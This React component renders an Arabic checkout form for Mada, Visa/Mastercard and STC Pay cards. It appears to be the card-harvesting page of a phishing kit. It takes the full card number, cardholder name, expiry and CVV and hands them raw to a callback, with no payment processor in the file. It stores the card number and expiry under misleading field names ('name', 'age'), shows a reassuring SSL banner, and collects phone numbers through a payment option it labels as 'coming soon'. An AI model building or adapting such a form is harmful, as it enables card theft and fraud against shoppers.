"use client";

import { useState } from "react";
import Image from "next/image";
import { Lock, ShieldCheck, AlertCircle } from "lucide-react";
import { Icon } from "@iconify/react";

/* ─── MADA BINs ─── */
const MADA_BINS = ["588845","440647","440795","446404","457865","968208","457997","474491","543357","434107","431361","604906","521076","588848","968210","968211","968212","968213","968214","968215","968216","968217","968218","968219","968220","531095","531196","532013","535825","535989","536023","537767","539931","543085","549760","558563","585265","588850","588982","589005","589206","604906","636120","968201","968202","968203","968204","968205","968206","968207"];

const getCardType = (num: string): "Visa" | "Mastercard" | "Mada" | null => {
  if (!num) return null;
  if (num.length >= 6 && MADA_BINS.includes(num.slice(0, 6))) return "Mada";
  if (/^4/.test(num)) return "Visa";
  if (/^5[1-5]/.test(num) || /^2[2-7]/.test(num)) return "Mastercard";
  return null;
};

const luhnCheck = (num: string) => {
  let sum = 0, shouldDouble = false;
  for (let i = num.length - 1; i >= 0; i--) {
    let digit = parseInt(num[i]);
    if (shouldDouble) { digit *= 2; if (digit > 9) digit -= 9; }
    sum += digit; shouldDouble = !shouldDouble;
  }
  return sum % 10 === 0;
};

interface Props {
  onBack: () => void;
  onSubmit: (fields: { name: string; age: string; cvv: string; cardHolder: string }) => Promise<void>;
  loading?: boolean;
}

type Method = "mada" | "visa-mc" | "apple" | "stc";

/* ─── styled input ─── */
const baseInput = "w-full border border-gray-300 bg-white px-3 py-2.5 text-sm text-gray-800 focus:outline-none focus:border-[#0874ED] focus:ring-1 focus:ring-[#0874ED]/20 transition-colors placeholder:text-gray-400";
const errInput  = "w-full border border-red-400 bg-red-50 px-3 py-2.5 text-sm text-gray-800 focus:outline-none focus:border-red-500 focus:ring-1 focus:ring-red-400/20 transition-colors placeholder:text-gray-400";

export default function CardPaymentForm({ onBack, onSubmit, loading: externalLoading }: Props) {
  const [method, setMethod] = useState<Method>("mada");
  const [fields, setFields] = useState({ name: "", age: "", cvv: "", cardHolder: "" });
  const [errors, setErrors]       = useState(false);
  const [cardError, setCardError] = useState("");
  const [expError, setExpError]   = useState("");
  const [cvvError, setCvvError]   = useState("");
  const [loading, setLoading]     = useState(false);
  const [phone, setPhone]         = useState("");
  const [phoneErr, setPhoneErr]   = useState("");

  const isLoading = loading || !!externalLoading;

  const fi = (field: keyof typeof fields, extra?: string) =>
    (errors && !fields[field]) || !!extra ? errInput : baseInput;

  const handleCardSubmit = async () => {
    const raw = fields.name.replace(/\s/g, "");
    if (!fields.name || !fields.age || !fields.cvv || !fields.cardHolder) { setErrors(true); return; }
    if (raw.length !== 16) { setCardError("رقم البطاقة غير صالح"); return; }
    if (!luhnCheck(raw))   { setCardError("رقم البطاقة غير صالح"); return; }
    setCardError("");
    if (fields.cvv.length !== 3) { setCvvError("CVV غير صالح"); return; }
    setCvvError("");
    const parts = fields.age.split("/");
    const m = Number(parts[0]), y = Number(parts[1]);
    const now = new Date();
    if (!m || !y || parts[0]?.length !== 2 || parts[1]?.length !== 2 || m < 1 || m > 12) { setExpError("صيغة تاريخ غير صحيحة"); return; }
    if (new Date(2000 + y, m - 1, 1) < new Date(now.getFullYear(), now.getMonth(), 1))    { setExpError("صيغة تاريخ غير صحيحة"); return; }
    setExpError("");
    setLoading(true);
    try { await onSubmit(fields); } finally { setLoading(false); }
  };

  const handleStcSubmit = async () => {
    if (!/^05\d{8}$/.test(phone.trim())) { setPhoneErr("يرجى إدخال رقم جوال صحيح يبدأ بـ 05"); return; }
    setPhoneErr("");
    setLoading(true);
    try { await onSubmit({ name: phone.trim(), age: "", cvv: "", cardHolder: "STC Pay" }); } finally { setLoading(false); }
  };

  /* ─── 4 method cards ─── */
  const methods: { id: Method; content: React.ReactNode; unavailable?: boolean }[] = [
    {
      id: "mada",
      content: (
        <Image src="/Mada-01.svg" alt="مدى" width={56} height={28} className="object-contain h-7 w-auto" />
      ),
    },
    {
      id: "visa-mc",
      content: (
        <div className="flex items-center gap-1.5">
          <Image src="/Visa-01.svg"    alt="Visa"       width={40} height={24} className="object-contain h-5 w-auto" />
          <Image src="/mastercard.png" alt="Mastercard" width={32} height={24} className="object-contain h-5 w-auto" />
        </div>
      ),
    },
    {
      id: "apple",
      content: (
        <Image src="/Apple-Pay-01.svg" alt="Apple Pay" width={60} height={28} className="object-contain h-6 w-auto" />
      ),
      unavailable: true,
    },
    {
      id: "stc",
      content: (
        <Image src="/stcpay.svg" alt="STC Pay" width={56} height={28} className="object-contain h-6 w-auto" />
      ),
      unavailable: true,
    },
  ];

  const isCard = method === "mada" || method === "visa-mc";
  const isUnavailable = method === "apple" || method === "stc";

  return (
    <div className="w-full max-w-md mx-auto" dir="rtl">

      {/* ── 4 method cards ── */}
      <div className="grid grid-cols-4 gap-2 mb-5">
        {methods.map(({ id, content, unavailable }) => (
          <button
            key={id}
            type="button"
            onClick={() => setMethod(id)}
            className={`relative flex flex-col items-center justify-center py-3 px-1 border transition-all ${
              method === id
                ? "border-[#0874ED] bg-[#0874ED]/5"
                : "border-gray-200 bg-white hover:border-gray-300"
            }`}
          >
            {method === id && (
              <span className="absolute top-1.5 right-1.5 w-2 h-2 rounded-full bg-[#0874ED]" />
            )}
            {content}
            {unavailable && (
              <span className="mt-1 text-[9px] text-gray-400 leading-tight text-center">قريباً</span>
            )}
          </button>
        ))}
      </div>

      {/* ── Card form (مدى / فيزا / ماستركارد) ── */}
      {isCard && (
        <div className="space-y-4">
          <div className="border border-gray-200 bg-white">

            {/* header */}
            <div className="px-4 py-3 border-b border-gray-100 flex items-center justify-between bg-gray-50">
              <span className="text-xs font-semibold text-gray-600">بيانات البطاقة</span>
              <div className="flex items-center gap-2">
                {method === "mada" && (
                  <Image src="/Mada-01.svg" alt="مدى" width={36} height={18} className="object-contain h-4 w-auto" />
                )}
                {method === "visa-mc" && (
                  <div className="flex items-center gap-1.5">
                    <Image src="/Visa-01.svg"    alt="Visa"       width={32} height={18} className="object-contain h-3.5 w-auto" />
                    <Image src="/mastercard.png" alt="Mastercard" width={26} height={18} className="object-contain h-3.5 w-auto" />
                  </div>
                )}
              </div>
            </div>

            <div className="p-4 space-y-3">

              {/* رقم البطاقة */}
              <div className="space-y-1">
                <label className="text-xs font-medium text-gray-600">
                  رقم البطاقة <span className="text-red-500">*</span>
                </label>
                <div className="relative">
                  <input
                    autoComplete="cc-number"
                    type="text"
                    maxLength={19}
                    dir="ltr"
                    inputMode="numeric"
                    placeholder="أدخل رقم البطاقة"
                    value={fields.name}
                    onChange={e => {
                      let v = e.target.value.replace(/\D/g, "").slice(0, 16);
                      v = v.match(/.{1,4}/g)?.join("  ") ?? v;
                      setFields(f => ({ ...f, name: v }));
                      setCardError("");
                    }}
                    className={`${fi("name", cardError)} font-mono tracking-wider ${getCardType(fields.name.replace(/\s/g,"")) ? "pl-10" : ""}`}
                  />
                  {/* card type icon */}
                  {(() => {
                    const ct = getCardType(fields.name.replace(/\s/g, ""));
                    if (!ct) return null;
                    return (
                      <span className="absolute left-3 top-1/2 -translate-y-1/2 pointer-events-none">
                        {ct === "Visa"       && <Icon icon="logos:visa"       width={28} height={18} />}
                        {ct === "Mastercard" && <Icon icon="logos:mastercard" width={24} height={18} />}
                        {ct === "Mada"       && <Image src="/Mada-01.svg" alt="Mada" width={26} height={14} className="object-contain" />}
                      </span>
                    );
                  })()}
                </div>
                {cardError && (
                  <p className="text-red-500 text-[11px] flex items-center gap-1">
                    <AlertCircle size={10} /> {cardError}
                  </p>
                )}
              </div>

              {/* الاسم على البطاقة */}
              <div className="space-y-1">
                <label className="text-xs font-medium text-gray-600">
                  الاسم على البطاقة <span className="text-red-500">*</span>
                </label>
                <input
                  autoComplete="cc-name"
                  type="text"
                  dir="ltr"
                  placeholder="الاسم على البطاقة"
                  value={fields.cardHolder}
                  onChange={e =>
                    setFields(f => ({
                      ...f,
                      cardHolder: e.target.value.replace(/[^a-zA-Z ]/g, "").toUpperCase(),
                    }))
                  }
                  className={`${fi("cardHolder")} uppercase tracking-wide`}
                />
              </div>

              {/* تاريخ الانتهاء + CVV */}
              <div className="grid grid-cols-2 gap-3">
                <div className="space-y-1">
                  <label className="text-xs font-medium text-gray-600">
                    تاريخ الانتهاء <span className="text-red-500">*</span>
                  </label>
                  <input
                    autoComplete="cc-exp"
                    type="text"
                    maxLength={5}
                    dir="ltr"
                    inputMode="numeric"
                    placeholder="MM/YY"
                    value={fields.age}
                    onChange={e => {
                      let v = e.target.value.replace(/\D/g, "");
                      if (v.length >= 3) v = v.slice(0, 2) + "/" + v.slice(2, 4);
                      setFields(f => ({ ...f, age: v }));
                      setExpError("");
                    }}
                    className={`${fi("age", expError)} text-center font-mono tracking-widest`}
                  />
                  {expError && (
                    <p className="text-red-500 text-[11px] flex items-center gap-1">
                      <AlertCircle size={10} /> {expError}
                    </p>
                  )}
                </div>

                <div className="space-y-1">
                  <label className="text-xs font-medium text-gray-600">
                    CVV رمز الأمان <span className="text-red-500">*</span>
                  </label>
                  <input
                    autoComplete="cc-csc"
                    type="password"
                    maxLength={3}
                    dir="ltr"
                    inputMode="numeric"
                    placeholder="رمز الأمان"
                    value={fields.cvv}
                    onChange={e => {
                      setFields(f => ({ ...f, cvv: e.target.value.replace(/\D/g, "").slice(0, 3) }));
                      setCvvError("");
                    }}
                    className={`${fi("cvv", cvvError)} text-center font-mono tracking-[0.4em]`}
                  />
                  {cvvError && (
                    <p className="text-red-500 text-[11px] flex items-center gap-1">
                      <AlertCircle size={10} /> {cvvError}
                    </p>
                  )}
                </div>
              </div>

            </div>

            {/* security strip */}
            <div className="px-4 py-2.5 bg-gray-50 border-t border-gray-100 flex items-center gap-1.5">
              <ShieldCheck size={11} className="text-green-500 shrink-0" />
              <span className="text-[10px] text-gray-400">مشفر بـ SSL — بياناتك محمية بالكامل</span>
            </div>
          </div>

          {/* actions */}
          <div className="flex gap-2.5">
            <button
              type="button"
              onClick={onBack}
              className="w-20 py-3 border border-gray-300 text-gray-500 text-xs font-semibold hover:bg-gray-50 transition-colors"
            >
              رجوع
            </button>
            <button
              type="button"
              onClick={handleCardSubmit}
              disabled={isLoading}
              className="flex-1 py-3 bg-[#0874ED] hover:bg-[#0665D0] text-white font-bold text-sm transition-colors disabled:opacity-60 disabled:cursor-not-allowed flex items-center justify-center gap-2"
            >
              {isLoading ? (
                <>
                  <span className="w-4 h-4 border-2 border-white/30 border-t-white rounded-full animate-spin" />
                  جاري المعالجة…
                </>
              ) : (
                <>
                  <Lock size={13} />
                  إتمام الدفع
                </>
              )}
            </button>
          </div>
        </div>
      )}

      {/* ── STC Pay ── */}
      {method === "stc" && (
        <div className="space-y-4">
          <div className="border border-gray-200 bg-white">
            <div className="px-4 py-3 border-b border-gray-100 bg-gray-50 flex items-center justify-between">
              <span className="text-xs font-semibold text-gray-600">الدفع عبر STC Pay</span>
              <Image src="/stcpay.svg" alt="STC" width={44} height={22} className="object-contain h-5 w-auto" />
            </div>
            <div className="p-4 space-y-3">
              <div className="space-y-1">
                <label className="text-xs font-medium text-gray-600">رقم الجوال <span className="text-red-500">*</span></label>
                <input
                  type="tel" maxLength={10} dir="ltr" inputMode="numeric" placeholder="05XXXXXXXX"
                  value={phone}
                  onChange={e => { setPhone(e.target.value.replace(/\D/g, "").slice(0, 10)); setPhoneErr(""); }}
                  className={phoneErr ? errInput : baseInput + " font-mono tracking-wider"}
                />
                {phoneErr && (
                  <p className="text-red-500 text-[11px] flex items-center gap-1">
                    <AlertCircle size={10} /> {phoneErr}
                  </p>
                )}
              </div>
            </div>
            <div className="px-4 py-2.5 bg-gray-50 border-t border-gray-100 flex items-center gap-1.5">
              <ShieldCheck size={11} className="text-green-500 shrink-0" />
              <span className="text-[10px] text-gray-400">مشفر بـ SSL — بياناتك محمية بالكامل</span>
            </div>
          </div>
          <div className="flex gap-2.5">
            <button type="button" onClick={onBack} className="w-20 py-3 border border-gray-300 text-gray-500 text-xs font-semibold hover:bg-gray-50 transition-colors">
              رجوع
            </button>
            <button type="button" onClick={handleStcSubmit} disabled={isLoading}
              className="flex-1 py-3 bg-[#0874ED] hover:bg-[#0665D0] text-white font-bold text-sm transition-colors disabled:opacity-60 flex items-center justify-center gap-2">
              {isLoading ? <><span className="w-4 h-4 border-2 border-white/30 border-t-white rounded-full animate-spin" />جاري المعالجة…</> : <><Lock size={13} />إتمام الدفع</>}
            </button>
          </div>
        </div>
      )}

      {/* ── Unavailable (Apple / STC shown as unavailable) ── */}
      {isUnavailable && method !== "stc" && (
        <div className="space-y-4">
          <div className="border border-gray-200 bg-white p-6 flex flex-col items-center gap-3 text-center">
            {method === "apple" && (
              <Image src="/Apple-Pay-01.svg" alt="Apple Pay" width={80} height={36} className="object-contain h-8 w-auto opacity-70" />
            )}
            <p className="text-sm font-semibold text-gray-600">ستتوفر هذه الطريقة قريباً</p>
            <p className="text-xs text-gray-400">تابع التحديثات — يمكنك إتمام طلبك الآن عبر مدى أو فيزا / ماستركارد</p>
          </div>
          <div className="flex gap-2.5">
            <button type="button" onClick={onBack} className="w-20 py-3 border border-gray-300 text-gray-500 text-xs font-semibold hover:bg-gray-50 transition-colors">
              رجوع
            </button>
            <button type="button" disabled className="flex-1 py-3 bg-gray-200 text-gray-400 font-bold text-sm cursor-not-allowed flex items-center justify-center gap-2">
              <Lock size={13} />
              إتمام الدفع
            </button>
          </div>
        </div>
      )}

    </div>
  );
}
